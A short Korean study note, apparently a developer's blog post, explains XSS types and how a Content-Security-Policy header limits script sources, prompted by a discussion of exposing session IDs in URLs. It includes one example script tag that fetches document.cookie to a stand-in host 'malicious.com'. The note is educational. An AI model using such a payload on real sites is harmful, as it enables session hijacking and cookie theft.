# XSS

카카오톡을 하다가(개발자 톡) 을 하다가 보안은 일단 CSP만 해놓을게란 내용이 나왔다.

맥락은 세션관리를 할때 sid를 주소에 노출시키는 방식으로 새로고침해도 세션이 유지되도록 진행하자 에서 나왔다.  
뭔지 까먹어서 다시 정리한다.

## XSS (Cross- site Scripting)

사용자가 입력한 데이터가 필터링이되지않고 js같은 함수가 실행이 되는것, 인잭션과 비슷한 이야기인거같다.

예를들어 사용자가 챗봇 입력창에

```xml
<script>fetch("https://malicious.com/steal?cookie=" + document.cookie)</script>
```

이런식으로 넣고 프론트를 랜더링하면 js가 실행이되고 쿠키를 탈취할 수 있게 됩니다

# CSP(Content-Security-Poliocy)

XSS등을 막기위해 브라우저가 어떤 리소스를 어디서 불러올 수 있는지 제한하는 보안 정책 헤더.

```
Content-Security-Policy: default-src 'self'; script-src 'self';
```

이렇게 하면 해당 도메인에서 제공한 스크립트만 실행가능!

# XSS는 어떻게 발생하는가?

특히 챗봇·댓글·입력폼이 있는 사이트에서 흔함.

1) Stored XSS

악성 스크립트가 DB에 저장되고 모든 사용자에게 계속 실행됨  
(게시판/챗봇에서 자주 발생)

2) Reflected XSS

URL 파라미터 등으로 넣은 값이 즉시 화면에 반사되어 실행  
(검색 페이지에서 흔함)

3) DOM-based XSS

JavaScript에서 user input을 innerHTML 등으로 삽입하면서 발생  
(React/SPA에서도 발생)

챗봇 프론트엔드에서 ‘메시지 렌더링 로직’이 그대로 innerHTML을 쓴다면 100% XSS 터짐.

# CSP는 어떻게 XSS를 막는가?

CSP의 핵심 기능은 브라우저가 JS 실행을 허용할 출처를 제한하는 것이다.

-   script-src→ 사이트 자체 JS만 실행.  
    → 공격자가 삽입한
-   `script-src 'self';`
-   어떤 JS만 실행할지 결정.

## 사실 근데

챗봇 세션 sid를 URL에 넣는 방식으로 구현 후 sid를 노출하지만 JWT값을 해더에 넣고 같이보내야 동작하지 않을까 궁금해졌다. -> 내가 그렇게 구현했는데 JWT와 sid를 알아도 올바른 Json형식을 모르면 오류를 뱉지 않을까?

네트워크 페이지의 페이로드를 보면 Json형식을 알 수 있다. 흠 그럼 대부분의 페이지의 보안이 문제가 있는거 아닌가 싶다.
